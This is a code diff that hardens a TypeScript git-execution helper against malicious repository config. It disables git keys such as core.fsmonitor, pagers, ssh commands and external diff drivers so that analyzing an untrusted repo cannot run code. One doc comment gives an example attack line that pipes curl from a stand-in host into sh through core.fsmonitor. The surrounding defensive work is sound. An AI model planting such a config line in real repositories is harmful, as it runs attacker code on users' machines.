@@ -24,6 +24,10 @@
  * return the `string` its signature promises; pass `{ encoding: 'buffer' }` for
  * bytes.
  *
+ * Every call also gets the {@link GIT_UNTRUSTED_CONFIG_OFF} argv prefix, which
+ * neutralizes the config keys git treats as COMMANDS TO RUN. See that constant
+ * for the threat and the residual.
+ *
  * Structural guards fail CI on a regression: `git-exec.test.ts` on a new `git`
  * spawn that skips this file, and `windows-hidden-spawn-guard.test.ts` on ANY
  * subprocess spawned without `windowsHide` and without an inherited console.
@@ -37,9 +41,121 @@ import {
   type ExecFileOptions,
   type ExecFileSyncOptions,
 } from 'node:child_process';
+import { basename } from 'node:path';
 import { promisify } from 'node:util';
 
 const rawExecFileAsync = promisify(execFile);
+
+/**
+ * The argv prefix that stops an ANALYZED REPOSITORY from executing code through git.
+ *
+ * Several git config keys are not settings but command strings git runs, and git reads
+ * them from the worktree's OWN `.git/config`. Running `git status` inside a directory
+ * someone else authored is therefore arbitrary code execution as the current user:
+ *
+ *     git config core.fsmonitor 'sh -c "curl evil.example | sh; echo /dev/null"'
+ *
+ * fires on a plain `git status --porcelain` — which is exactly what `openlore analyze`
+ * runs, twice, on every invocation (`source-state.ts`). `enforce`, `drift`,
+ * `blast_radius` and `map_in_flight_conflicts` reach the same spawns. This is not a
+ * hypothetical worktree: a repo handed over as a zip/tarball, a vendored or submodule
+ * worktree, or a "here is my bug, please look" clone all ship a `.git` the author wrote.
+ *
+ * `safe.directory` does NOT cover this. It only refuses a differently-OWNED directory,
+ * so anything the developer unpacked themselves is owned by them and fully trusted.
+ *
+ * A command-line `-c` beats the repository's config file, so this prefix disables each
+ * key regardless of what the repo asked for. It is applied to every git spawn rather
+ * than to the ones that look dangerous, because which key fires depends on the repo's
+ * config and attributes, not on the subcommand we chose.
+ *
+ * Note what is NOT here: `diff.external`. Setting it EMPTY does not disable it — git
+ * tries to RUN the empty string and dies with "cannot run : No such file or directory",
+ * breaking every diff. The documented off-switch is the `--no-ext-diff` flag, so external
+ * diff and attribute-driven textconv are handled by {@link DIFF_DRIVER_OFF} below instead.
+ *
+ * RESIDUAL, stated honestly: `filter.<name>.clean/smudge` is also a command string and
+ * cannot be turned off centrally, because the driver NAME is chosen by the repository and
+ * `-c` has no wildcard. It needs an attribute opt-in plus a checkout-ish operation, which
+ * nothing here performs. Everything git will run without an attribute opt-in is covered.
+ */
+export const GIT_UNTRUSTED_CONFIG_OFF: readonly string[] = [
+  // Runs on `git status` / `git diff` to speed up dirty-file detection. The verified vector.
+  '-c', 'core.fsmonitor=false',
+  // Runs to page output. We never want a pager in a subprocess regardless.
+  '-c', 'core.pager=cat',
+  // Runs for any transport that shells out to ssh.
+  '-c', 'core.sshCommand=',
+  // `ext::<command>` URLs execute their argument. No remote we use needs it.
+  '-c', 'protocol.ext.allow=never',
+  // Server-side hooks, reachable if a caller ever serves a repo.
+  '-c', 'uploadpack.packObjectsHook=',
+];
+
+/**
+ * Per-subcommand flags that disable the two REPO-CHOSEN DIFF DRIVERS git would otherwise run.
+ *
+ * `--no-ext-diff` defeats `diff.external`; `--no-textconv` defeats the
+ * `.gitattributes`-selected `diff.<name>.textconv`. Both are commands the analyzed repository
+ * supplies, and both fire on an ordinary `git diff`/`git log` — verified: a repo with
+ * `diff.external` set runs it on a plain `git diff`, and `--no-ext-diff` both blocks it and
+ * still produces the real diff.
+ *
+ * These are FLAGS rather than `-c` overrides because that is the only mechanism git offers
+ * (see the note in {@link GIT_UNTRUSTED_CONFIG_OFF}), which is why they are keyed by
+ * subcommand: only the diff-producing commands accept them.
+ */
+const DIFF_DRIVER_OFF = ['--no-ext-diff', '--no-textconv'] as const;
+
+/**
+ * Disable the repository's hook directory — for the subcommands that actually RUN hooks.
+ *
+ * Scoped rather than always-on because `-c core.hooksPath=` POISONS A CONFIG READ: with it
+ * set, `git rev-parse --git-path hooks` answers `./` instead of `.git/hooks`, which sent
+ * OpenLore's own hook installer at the repository root. Nothing here commits today, so the
+ * always-on version bought no protection and cost a correct answer.
+ *
+ * Keeping it for the hook-running verbs means a future caller that adds one does not inherit
+ * `core.hooksPath` from the analyzed repository, while every read-only command — and every
+ * `git config` query — still sees the repo's real configuration.
+ */
+const HOOKS_OFF = ['-c', 'core.hooksPath='] as const;
+
+/** Subcommands that run repository hooks. */
+const HOOK_RUNNING_SUBCOMMANDS = new Set([
+  'commit', 'merge', 'rebase', 'checkout', 'switch', 'am', 'pull', 'push',
+  'cherry-pick', 'revert', 'stash', 'clone', 'worktree', 'gc',
+]);
+
+/** Subcommands that accept {@link DIFF_DRIVER_OFF}. Verified against git 2.50. */
+const DIFF_DRIVER_SUBCOMMANDS = new Set([
+  'diff', 'log', 'show', 'whatchanged', 'diff-tree', 'diff-index', 'diff-files', 'format-patch', 'range-diff',
+]);
+
+/** True when `file` names the git binary (bare, absolute, or `.exe`). */
+function isGitBinary(file: string): boolean {
+  const base = basename(String(file)).toLowerCase();
+  return base === 'git' || base === 'git.exe';
+}
+
+/**
+ * Prepend {@link GIT_UNTRUSTED_CONFIG_OFF} to a git argv.
+ *
+ * A non-git binary routed through these helpers (for the `windowsHide` discipline alone)
+ * is passed through untouched — git's `-c` flags would be meaningless or hostile there.
+ */
+function hardenedArgs(file: string, args?: readonly string[]): string[] | undefined {
+  if (!isGitBinary(file)) return args as string[] | undefined;
+  const rest = [...(args ?? [])];
+  // The subcommand is argv[0] here: callers pass it directly, and any `-c` this module adds
+  // goes in front afterwards. Insert the driver flags immediately AFTER it, where git expects
+  // its own options, and only for the subcommands that accept them.
+  if (rest.length > 0 && DIFF_DRIVER_SUBCOMMANDS.has(rest[0])) {
+    rest.splice(1, 0, ...DIFF_DRIVER_OFF);
+  }
+  const hooksOff = rest.length > 0 && HOOK_RUNNING_SUBCOMMANDS.has(rest[0]) ? HOOKS_OFF : [];
+  return [...GIT_UNTRUSTED_CONFIG_OFF, ...hooksOff, ...rest];
+}
 
 /** Promisified `execFile`, `windowsHide: true` always applied. */
 export function execFileGit(
@@ -58,7 +174,7 @@ export function execFileGit(
   options?: ExecFileOptions,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- implementation signature for the overloads above
 ): Promise<any> {
-  return rawExecFileAsync(file, args as string[], { ...options, windowsHide: true });
+  return rawExecFileAsync(file, hardenedArgs(file, args) as string[], { ...options, windowsHide: true });
 }
 
 /**
@@ -84,7 +200,7 @@ export function execFileGitSync(
   options?: ExecFileSyncOptions,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- implementation signature for the overloads above
 ): any {
-  return execFileSync(file, args, { encoding: 'utf-8', ...options, windowsHide: true });
+  return execFileSync(file, hardenedArgs(file, args), { encoding: 'utf-8', ...options, windowsHide: true });
 }
 
 /**
@@ -100,7 +216,7 @@ export const spawnGit: typeof spawn = (
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- transparent pass-through to the overloads above
   file: any, args?: any, options?: any,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- ditto
-): any => spawn(file, args, { ...(options ?? {}), windowsHide: true });
+): any => spawn(file, hardenedArgs(file, args), { ...(options ?? {}), windowsHide: true });
 
 /**
  * `spawnSync`, `windowsHide: true` always applied — for the synchronous shapes `execFileSync`
@@ -113,4 +229,4 @@ export const spawnGitSync: typeof spawnSync = (
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- transparent pass-through to the overloads above
   file: any, args?: any, options?: any,
   // eslint-disable-next-line @typescript-eslint/no-explicit-any -- ditto
-): any => spawnSync(file, args, { ...(options ?? {}), windowsHide: true });
+): any => spawnSync(file, hardenedArgs(file, args), { ...(options ?? {}), windowsHide: true });
